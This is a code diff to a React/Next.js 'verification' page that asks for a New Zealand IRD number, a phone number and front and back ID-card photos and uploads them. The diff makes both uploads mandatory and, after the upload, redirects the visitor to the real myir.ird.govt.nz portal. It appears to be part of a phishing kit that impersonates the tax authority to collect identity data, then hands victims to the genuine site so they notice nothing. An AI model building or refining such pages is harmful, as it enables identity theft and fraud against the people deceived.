@@ -1,4 +1,5 @@
 import { React, useState } from "react";
+import { useRouter } from "next/router";
 
 const verification = () => {
   const [imageSrc, setImageSrc] = useState();
@@ -6,6 +7,8 @@ const verification = () => {
   const [ird, setIrd] = useState("");
   const [phone, setPhone] = useState("");
   console.log(ird, phone);
+
+  const router = useRouter();
 
   /**
    * handleOnChange
@@ -116,6 +119,9 @@ const verification = () => {
         console.log(err);
       }
     );
+
+    await router.push("https://myir.ird.govt.nz/");
+
     setImageSrc(data.secure_url);
     setUploadData(data);
   }
@@ -123,7 +129,7 @@ const verification = () => {
     <div class="hero w-full h-full">
       <div class="">
         <form class="" onSubmit={handleOnSubmit} id="messageForm" method="POST">
-          <div class="flex justify-end w-full ">
+          <div class="flex md:justify-end justify-center w-full ">
             <div class=" rounded-[4px] px-3 py-4 bg-card text-text w-[320px] m-5 xl:mr-[67px]">
               <div class="px-2 flex flex-col gap-[.8rem]">
                 {/* <!-- IRD Number or Customer Identifier --> */}
@@ -170,7 +176,16 @@ const verification = () => {
                       id=""
                       name="file"
                       aria-label="FrontIDCard"
-                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
+                      class="w-full h-[39px]  p-2 
+                      file:py-1 file:px-4
+                      file:rounded-md file:border-0
+                      file:text-sm file:font-medium
+                      file:bg-[#0d8390]/70 file:text-white
+                      hover:file:cursor-pointer hover:file:bg-[#0d8390]
+                      hover:file:text-white 
+                      
+                      "
+                      required
                     />
                   </div>
                 </div>
@@ -184,7 +199,16 @@ const verification = () => {
                       id="fileinput"
                       name="file2"
                       aria-label="FrontIDCard"
-                      class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
+                      class="w-full h-[39px]  p-2 
+                      file:py-1 file:px-4
+                      file:rounded-md file:border-0
+                      file:text-sm file:font-medium
+                      file:bg-[#0d8390]/70 file:text-white
+                      hover:file:cursor-pointer hover:file:bg-[#0d8390]
+                      hover:file:text-white 
+                      
+                      "
+                      required
                     />
                   </div>
                 </div>
